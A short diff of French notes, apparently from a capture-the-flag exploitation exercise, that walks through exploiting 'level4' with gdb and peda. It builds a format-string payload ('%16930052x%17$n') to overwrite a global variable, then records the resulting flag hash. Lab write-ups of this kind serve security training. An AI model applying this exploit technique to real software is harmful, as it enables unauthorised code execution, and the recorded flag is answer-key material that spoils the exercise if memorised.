@@ -1,0 +1,30 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./level4
+
+info function:
+-----> Le binaire contient 3 fonctions (main, p et n).
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+b *0x08048455
+
+r < <(python -c 'print "A" * 20 + "\x10\x98\x04\x08" + "B" * 40 + "%17$n"')
+
+x/d 0x8049810
+---> m = 64
+
+r < <(python -c 'print "A" * 20 + "\x10\x98\x04\x08" + "B" * 40 + "%16930052x" + "%17$n"')
+
+x/d 0x8049810
+---> m = 16930116
+
+On quite gdb.
+
+python -c 'print "A" * 20 + "\x10\x98\x04\x08" + "B" * 40 + "%16930052x" + "%17$n"' > /tmp/tmp
+
+
+cat /tmp/tmp - | ./level4
+
+--> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
